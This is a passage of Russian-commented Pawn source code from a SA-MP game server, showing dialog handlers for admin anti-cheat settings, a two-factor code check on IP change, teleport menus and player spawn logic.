			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][16] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][16] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][16] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 397:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][17] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][17] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][17] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 398:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][18] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][18] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][18] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 399:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][19] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][19] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][19] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 400:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][20] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][20] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][20] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 401:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][21] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][21] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][21] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 402:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][22] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][22] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][22] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 403:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][23] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][23] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][23] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 404:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][24] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][24] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][24] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 405:
		{
			if(!response) return ShowCheatSettingsApanel(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][25] = 0;//Отключен
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][25] = 1;//Писать в чат
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][25] = 2;//Включено
					ShowCheatSettingsApanel(playerid);
					SaveSettings();
				}
			}
		}
		case 406:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][26] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][26] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][26] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 407:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][27] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][27] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][27] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 408:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][28] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][28] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][28] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 409:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][29] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][29] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][29] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 410:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][30] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][30] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][30] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 411:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][31] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][31] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][31] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 412:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][32] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][32] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][32] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 413:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][33] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][33] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][33] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 414:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][34] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][34] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][34] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 415:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][35] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][35] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][35] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 416:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][36] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][36] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][36] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 417:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][37] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][37] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][37] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 418:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][38] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][38] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][38] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 419:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][39] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][39] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][39] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 420:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][40] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][40] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][40] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 421:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][41] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][41] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][41] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 422:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][42] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][42] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][42] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 423:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][43] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][43] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][43] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 424:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][44] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][44] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][44] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 425:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][45] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][45] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][45] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 426:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][46] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][46] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][46] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 427:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][47] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][47] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][47] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 428:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][48] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][48] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][48] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 429:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][49] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][49] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][49] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 430:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][50] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][50] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][50] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 431:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][51] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][51] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][51] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
			}
		}
		case 432:
		{
			if(!response) return ShowCheatSettingsApanel2(playerid);
			switch(listitem)
			{
				case 0:
				{
					SettingInfo[CheatSetting][52] = 0;//Отключен
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 1:
				{
					SettingInfo[CheatSetting][52] = 1;//Писать в чат
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
				}
				case 2:
				{
					SettingInfo[CheatSetting][52] = 2;//Включено
					ShowCheatSettingsApanel2(playerid);
					SaveSettings();
                }
			}
		}
	case 1812:
	    {
	        if(!response) return SCM(playerid, COLOR_LIGHTRED, " Введите /q(uit) для выхода с игры"), Kick(playerid);
	        else
	        {
	            if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,1812,DIALOG_STYLE_PASSWORD, "Ввод параметра", "      ==== Ваш IP адрес сменился ====\n=== Введите гугл-код ===", "Готово", "Отмена");
	            new mustGoogleKey = GoogleAuthenticatorCode(PlayerInfo[playerid][pGoogleKey], gettime());
	            if(strval(inputtext) != mustGoogleKey)
	            {
	                SCM(playerid, COLOR_LIGHTRED, " Вы ввели не верный код");
	                Kick(playerid);
	            }
	            else
	            {
	                new playersip[64];
					new sendername[MAX_PLAYER_NAME];
					GetPlayerIp(playerid,playersip,sizeof(playersip));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					Online[playerid] = 0;
					PlayerInfo[playerid][pLogin] = 1;
					Convoi[playerid] = 9999;
					SpawnPlayer(playerid);
					TogglePlayerControllable(playerid, 1);
					if(PlayerInfo[playerid][pPHouseKey] != 9999)
					{
						new house = PlayerInfo[playerid][pPHouseKey];
						createdcar = house_car[playerid];
						house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][GetPVarInt(playerid, "chosencar")], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][GetPVarInt(playerid, "chosencar")] ,CarInfo[playerid][carColor_two][GetPVarInt(playerid, "chosencar")], 86400);
						SetVehicleParamsEx(house_car[playerid],false,false,false,true,false,false,false);
						CarHealth[house_car[playerid]] = float(1000);
						createdcar ++;
						new pveh = GetPVarInt(playerid, "chosencar");
						Fuell[house_car[playerid]] = CarInfo[playerid][carFuel][pveh];
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_1][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_2][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_3][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_4][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_5][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_6][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_7][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_8][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_9][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_10][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_11][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_12][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_13][pveh]);
						AddVehicleComponent(house_car[playerid], CarInfo[playerid][carVehcom_14][pveh]);
					}
	            }
	        }
	    }
	case 9000:
		{
			if(!response) return true;
            if(listitem == 18)
			{
				new teleport[] = "[18] Зона 51 склад [key:19]\n[19] Форт карсон [key:20]\n[20] Гетто [key:21]\n[21] Тюрьма ЛВ [key:22]\n[22] Тюрьма СФ [key:23]\n[23] Работа прораба [key:24]\n[24] За рестораном [key:25]\n[25] Дракона [key:26]\n[26] Калигула [key:27]\n[27] ЖД - ЛС [key:28]\n<< Пред.страница";
				ShowPlayerDialogEx(playerid,9001,DIALOG_STYLE_LIST, "Меню",teleport, "Выбрать", "Назад");
			}
			else
			{
				format(string, sizeof(string), "/tp %i", listitem+1);
				CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			}
		}
	case 9001:
		{
			if(!response) return true;
			if(listitem == 10)
			{
				new teleport[] = "[0] LSPD [key:1]\n[1] LSPD-Тюрьма [key:2]\n[2] Мэрия [key:3]\n[3] Автовокзал ЛС [key:4]\n[4] ЛС-СФ Шоссе [key:5]\n[5] Автошкола [key:6]\n[6] ФБР [key:7]\n[7] Аэропорт СФ [key:8]\n[8] Аэропорт ЛС [key:9]\n[9] Военная база [key:10]\n[10] Цент Лас Вентурас [key:11]\n[11] Клуб Джизи [key:12]\n[12] Админ казино [key:13]\n[13] Вокзал ЛВ [key:14]\n[14] Аэро ЛС Въезд [key:15]\n[15] Вокзал СФ [key:16]\n[16] Авианосец стоянка [key:17]\n[17] Авианосец [key:18]\n>> След.страница";
				ShowPlayerDialogEx(playerid,9000,DIALOG_STYLE_LIST, "Меню",teleport, "Выбрать", "Назад");
			}
			else
			{
				format(string, sizeof(string), "/tp %i", listitem+19);
				CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			}
		}
	}
	while(strfind(inputtext, "%s",true)!=-1)
	{
		strdel(inputtext,strfind(inputtext, "%s",true),strfind(inputtext, "%s",true)+2);
	}
	return true;
}
publics: SetPlayerSpawn(playerid)
{
	DollahScoreUpdate(playerid);
	if(IsPlayerConnected(playerid))
	{
	    TextDrawShowForPlayer(playerid, Golod_TD[0]);
	    PlayerTextDrawShow(playerid, Golod_PTD[playerid][0]);
		if(PlayerInfo[playerid][pQuestShow] == 0)
		{
			ShowPlayerDialogEx(playerid,11228,DIALOG_STYLE_MSGBOX,"Задание","Здравствуйте! Вам пишет,игровой робот-спамер,по распоряжению Администрации нашего проекта.\nМы с администрацией рады каждому новому игроку и очень переживаем,\nчто новичкам иногда трудно разобраться в игре сразу после регистрации.\nПо этой причине мы приготовили небольошое описание действий,\nкоторое надо совершить в первую очередь,чтобы понять основные игровые моменты",
			"Готово","");
			PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
			PlayerInfo[playerid][pQuestShow] = 1;
		}
		if(PlayerInfo[playerid][pWantedLevel] >= 1) SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWantedLevel] );
		SetPlayerHealthAC(playerid, PlayerInfo[playerid][pHP]);
		new house = PlayerInfo[playerid][pPHouseKey];
		switch(PlayerInfo[playerid][pMember] && GetPVarInt(playerid,"Fraction_Duty"))
		{
		case 1,2,3,4,7,8,9,10,11,16,19,20,21,22,23:
			{
				ResetPlayerWeapons(playerid);
				SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			}
		}
		switch(PlayerInfo[playerid][pMember] && !GetPVarInt(playerid,"Fraction_Duty"))
		{
		case 1,2,3,4,7,8,9,10,11,16,19,20,21,22,23:
			{
				SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
				SetPlayerColor(playerid, TEAM_HIT_COLOR);
			}
		}
	/*	switch(PlayerInfo[playerid][pMember])
		{
		    case 1,3,10,19,21:
		    {
				if(GetPVarInt(playerid, "Fraction_Duty") == 1)
				{
					Update3DTextLabelText(LabelRank[playerid], TEAM_GROVE_COLOR, GetRank(playerid));
					//SendMes(playerid, -1, " Ты %s", GetRank(playerid));
				}
				else
				{
					Update3DTextLabelText(LabelRank[playerid], TEAM_GROVE_COLOR, "");
				}
		    }
		    default:
		    {
				Update3DTextLabelText(LabelRank[playerid], TEAM_GROVE_COLOR, "");
				//SCM(playerid, -1, " Ты никто");
		    }
		}*/
		if(GetPVarInt(playerid,"Fraction_Duty"))
		{
			switch(PlayerInfo[playerid][pMember])
			{
			case 5,6,14:
				{
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerToTeamColor(playerid);
				}
			case 12,13,15,17,18:
				{
					SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerToTeamColor(playerid);
					GiveWeapon(playerid,5,1);
				}
			case 24,26,29:
			    {
			    	SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
					SetPlayerToTeamColor(playerid);
					GiveWeapon(playerid,7,1);
			    }
			}
		}
		if(GetPVarInt(playerid,"Fraction_Duty"))
		{
			switch(PlayerInfo[playerid][pMember])
			{
			case 5: GiveWeapon(playerid,2,1);
			case 14: GiveWeapon(playerid,1,1);
			case 6: GiveWeapon(playerid,8,1);
			case 9, 16, 20: GiveWeapon(playerid, 43, 60);
			
			}
		}
		if(PlayerInfo[playerid][pMember] <= 0)
		{
			SetPlayerSkin(playerid, PlayerInfo[playerid][pChar][0]);
			SetPlayerColor(playerid, TEAM_HIT_COLOR);
		}
		//----------------------------------------------------------------------
		if(PlayerInfo[playerid][pJailTime] > 0)
		{
			switch(PlayerInfo[playerid][pMestoJail])
			{
			case 1:
				{
					SetPlayerVirtualWorld(playerid, 1);
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid,1419.8373,1608.7216,1019.6279);
					SetPlayerFacingAngle(playerid, 92.4315);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			case 2:
				{
                    SetPlayerVirtualWorld(playerid, 1);
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid,1420.0908,1605.4238,1019.6279);
					SetPlayerFacingAngle(playerid, 89.7681);
					SetCameraBehindPlayer(playerid);
					return true;
				}
			}
		}
		if(GetPVarInt(playerid, "player_paint") == 2 && paint_info[1] == 2)
		{
			GiveWeapon(playerid, 24, 28);//PaintGun[random(sizeof(PaintGun))], 300);
			new rand = random(sizeof(PaintballSpawns));
			SetPlayerPos(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
			SetPlayerInterior(playerid,0);
			return true;
		}
		if(training[playerid] != 0)
		{
			SetPlayerInterior(playerid,5);
			SetPlayerPos(playerid,772.2284,8.0465,1000.7086);
			SetPlayerFacingAngle(playerid, 90.4423);
			SetPlayerSkin(playerid,81);
			return true;
		}
		if(house != 9999)//если есть дом
		{
			if((!GetPVarInt(playerid, "Fraction_Duty") && PlayerInfo[playerid][pSpawnChange][0] == 0) || (PlayerInfo[playerid][pSpawnChange][1] == 0 && GetPVarInt(playerid, "Fraction_Duty")))
			{
				SetPlayerInterior(playerid,HouseInfo[house][hInt]);
				SetPlayerPos(playerid, HouseInfo[house][hExitx], HouseInfo[house][hExity],HouseInfo[house][hExitz]);
				SetPlayerVirtualWorld(playerid, house+50);
				return true;
			}
		}
		if(KGet(playerid))
		{
			if(PlayerInfo[playerid][pSpawnChange][0] == 0 || PlayerInfo[playerid][pSpawnChange][1] == 0)
			{
				if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][kInt] == 0)
				{
					SetPVarInt(playerid, "podeezd", kvartinfo[PlayerInfo[playerid][pKvartiraKey]][virtmir]);
					SetPlayerPos(playerid,2283.3474,-1139.2313,1050.8984);
					SetPlayerInterior(playerid,11);
					SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pKvartiraKey]);
					SetCameraBehindPlayer(playerid);
					return true;
				}
